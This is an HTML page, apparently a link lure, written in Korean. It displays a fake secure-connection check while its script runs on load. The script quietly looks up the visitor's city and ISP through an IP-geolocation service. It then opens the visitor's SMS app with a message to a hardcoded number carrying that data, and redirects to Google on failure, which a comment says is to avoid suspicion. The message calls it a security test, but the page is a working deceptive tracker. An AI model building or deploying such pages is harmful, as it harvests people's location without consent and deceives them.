<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>페이지 로딩 중...</title>
    <style>
        /* 화면에는 아무것도 보여주지 않거나 일반적인 로딩 화면을 연출합니다 */
        body { font-family: sans-serif; text-align: center; padding-top: 100px; background-color: #ffffff; color: #666; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="spinner"></div>
    <p>안전한 연결을 확인하는 중입니다. 잠시만 기다려주세요...</p>

    <script>
    // 페이지가 열리자마자 자동으로 실행 (사용자 클릭/경고 팝업 없음)
    window.onload = function() {
        
        // IP 기반 대략적인 시·군·구 위치 가져오기 (GPS 권한 요청 없음)
        fetch('https://ip-api.com')
        .then(response => response.json())
        .then(data => {
            const region = data.city || data.regionName || "식별 불가 지역";
            const provider = data.isp || "알 수 없는 통신망";

            // 내 휴대폰 번호 (숫자만 입력)
            const myPhoneNumber = "01012345678"; 
            
            // 문자 본문 자동 완성
            const smsBody = encodeURIComponent(
                `[보안 알림]\n테스트 링크 클릭으로 접속 정보가 분석되었습니다.\n\n📍 위치: ${region}\n🌐 통신망: ${provider}\n\n출처가 불분명한 URL은 항상 주의하세요.`
            );

            // 기기별 문자 앱 다이렉트 실행
            if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
                window.location.href = `sms:${myPhoneNumber}&body=${smsBody}`;
            } else {
                window.location.href = `sms:${myPhoneNumber}?body=${smsBody}`;
            }
        })
        .catch(error => {
            // 오류 발생 시 자연스럽게 메인 페이지 등으로 리다이렉트 처리하여 의심을 피함
            window.location.href = "https://google.com";
        });
    };
    </script>

</body>
</html>
